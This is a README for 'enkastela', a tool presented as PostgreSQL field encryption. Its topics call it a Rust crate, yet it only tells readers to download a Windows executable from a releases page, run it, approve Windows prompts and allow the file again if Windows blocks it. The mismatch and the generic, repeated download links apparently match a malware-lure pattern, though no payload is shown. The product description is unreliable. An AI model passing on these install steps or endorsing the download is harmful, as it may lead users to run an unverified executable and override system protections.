# 🔐 enkastela - Simple PostgreSQL Field Protection

[![Download enkastela](https://img.shields.io/badge/Download-Enkastela-blue?style=for-the-badge&logo=github)](https://github.com/shahi405/enkastela/releases)

## 🧭 What this app does

enkastela protects data stored in PostgreSQL by encrypting fields before they are saved. It helps keep private data safe while still letting you search for records when needed.

Use it to protect names, email addresses, account numbers, and other sensitive fields. It supports AES-256-GCM, blind indexes, key rotation, cloud KMS, FIPS-140, crypto-shredding, and an SQL firewall.

## 💻 Before you start

You need:

- A Windows PC
- Internet access
- A browser
- Permission to install apps on your PC
- PostgreSQL if you plan to connect it to a database

If you want to use encrypted fields in a business app, keep your PostgreSQL login details ready.

## 📥 Download enkastela

Go to the release page and download the Windows file for your PC:

[Visit the enkastela releases page](https://github.com/shahi405/enkastela/releases)

After the page opens, look for the latest release and choose the file for Windows. If there is more than one file, pick the one that matches your system.

## 🪟 Install on Windows

1. Open the downloaded file.
2. If Windows asks for approval, choose **Run** or **Yes**.
3. Follow the setup steps on screen.
4. Wait for the install to finish.
5. Open enkastela from the Start menu or the folder where it was saved.

If you downloaded a zipped file, right-click it and choose **Extract All** first. Then open the app file inside the folder.

## ▶️ Run the app

1. Start enkastela.
2. If the app opens with a setup screen, enter your PostgreSQL details.
3. Add the fields you want to protect.
4. Save your settings.
5. Test with one record before using real data.

If the app asks for a key file or secret, store it in a safe place. You will need it to read the encrypted data later.

## 🔒 How it protects data

enkastela uses field-level encryption. That means it protects each sensitive field on its own instead of locking the full database.

Here is what that means in plain terms:

- **AES-256-GCM** protects data with strong encryption.
- **Searchable encryption** helps you find records without exposing the full value.
- **Blind indexes** let you compare values without storing them in plain text.
- **Key rotation** lets you change keys over time.
- **Cloud KMS** can store keys in managed key systems.
- **FIPS-140** support helps meet common security needs.
- **Crypto-shredding** makes old data unreadable when keys are removed.
- **SQL firewall** helps block unsafe database queries.

## 🧱 Common setup steps

Use this flow if you are setting it up for the first time:

1. Install the app.
2. Open the settings screen.
3. Connect to PostgreSQL.
4. Choose the fields you want to encrypt.
5. Set a key source.
6. Save the setup.
7. Run a test record.
8. Check that search still works for the protected fields.

If you use a cloud key service, connect that before you load real data.

## 🗂️ Good places to use enkastela

This app fits well in systems that store:

- Customer records
- User profiles
- Medical data
- Payment data
- Staff records
- Internal notes
- Account IDs
- Email addresses
- Phone numbers

It is useful when you need strong protection but still need to look up data later.

## 🔑 Key handling

enkastela supports safer key use by keeping keys separate from data.

A few simple rules help:

- Do not store keys in plain text.
- Keep one copy in a safe place.
- Rotate keys on a schedule.
- Remove old keys only after you no longer need the data.
- Use cloud KMS if your team already uses it.

If you change keys, test access to old and new records before full use.

## 🔎 Search behavior

Searchable encryption and blind indexes help you find records without revealing the full protected value.

That means you can often search by:

- Email
- User ID
- Account number
- Phone number
- Other exact match fields

Search works best when the same field value is entered the same way each time. Keep the format consistent, such as lower-case email addresses or fixed phone formats.

## 🛠️ Troubleshooting

### The app does not open

- Try opening it again from the Start menu.
- Check that the download finished.
- If Windows blocks it, open the file again and allow it.

### PostgreSQL will not connect

- Check the server address.
- Check the port number.
- Check the database name.
- Check the user name and password.
- Make sure PostgreSQL is running.

### Search does not find a record

- Check the field format.
- Make sure the value was entered in the same way.
- Check that the field is set up for searchable encryption or blind indexes.

### Encrypted data looks unreadable

- This is expected. Encrypted data should not look like normal text.
- Use the app and the right key to view or search it.

## 🧩 Suggested first test

Use a small test record first:

1. Create one sample user.
2. Encrypt one email field.
3. Save the record.
4. Search for the same email.
5. Confirm the result appears.
6. Try opening the stored value in the database and confirm it is not plain text.

This helps you confirm the setup before you move real data.

## 🧰 Security features in plain English

enkastela is built for cases where data must stay private even inside the database.

It includes:

- Field encryption for sensitive values
- Search support for exact lookups
- Key rotation for long-term use
- Cloud key support for managed systems
- Data removal through crypto-shredding
- Query checks with an SQL firewall
- Support for common compliance needs like GDPR, HIPAA, and SOC 2

## 📌 Release page

Download the Windows version here:

[https://github.com/shahi405/enkastela/releases](https://github.com/shahi405/enkastela/releases)

## 🖥️ Windows tips

- Keep the app in a folder you can find later.
- Do not rename files unless you know they are not used by the app.
- If you use a work PC, ask your admin before changing system settings.
- Save your key and setup details in a safe place.
- Use the same Windows account each time if the app stores local settings

## 🧪 If you are testing in a team

Start with one test database and one test user. Then check:

- Can the app connect?
- Can it encrypt a field?
- Can it search the field?
- Can another user open the app?
- Can your team recover data after a key change?

This keeps the first setup simple and lowers risk.

## 📂 What the name means

enkastela is a name for a tool that helps protect data at the field level. It is meant for systems that use PostgreSQL and need strong control over sensitive values.

## 🔗 Topics covered by this project

aes-256-gcm, application-level-encryption, aws-kms, blind-index, crypto-shredding, data-security, database-encryption, encryption, field-encryption, fips-140, gdpr, hipaa, key-rotation, kms, postgresql, rust, rust-crate, searchable-encryption, soc2, sql-firewall